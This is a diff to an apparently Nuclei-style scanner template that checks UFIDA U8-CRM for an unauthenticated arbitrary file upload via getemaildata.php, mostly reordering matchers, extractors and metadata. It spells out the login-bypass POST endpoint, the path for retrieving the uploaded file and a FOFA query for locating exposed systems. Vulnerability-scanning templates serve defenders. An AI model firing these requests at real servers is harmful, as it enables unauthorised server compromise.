@@ -1,20 +1,32 @@
 id: yonyou-u8-crm-fileupload
-
 info:
-  name: UFIDA U8-CRM getemaildata - Arbitrary File Upload
+  name: UFIDA U8-CRM getemaildata - Arbitary File Upload
   author: SleepingBag945,pussycat0x
   severity: critical
   description: |
     There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
-    max-request: 2
     fofa-query: body="用友U8CRM"
-  tags: yonyou,file-upload,u8-crm,intrusive,vuln
-
+    max-request: 2
+    verified: true
+  tags: file-upload,intrusive,u8-crm,vuln,yonyou
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: path
+        part: body_1
+        regex:
+          - ([a-zA-Z0-9]+)\.tmp\.mht
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - status_code_1==200 && status_code_2==200
+          - contains(body_2, '{{randstr}}')
+        type: dsl
+    raw:
       - |
         POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
         Host: {{Hostname}}
@@ -42,20 +54,3 @@ http:
       - |
         GET /tmpfile/{{path}}.tmp.mht HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "status_code_1==200 && status_code_2==200"
-          - "contains(body_2, '{{randstr}}')"
-        condition: and
-
-    extractors:
-      - type: regex
-        part: body_1
-        internal: true
-        name: path
-        group: 1
-        regex:
-          - '([a-zA-Z0-9]+)\.tmp\.mht'
-
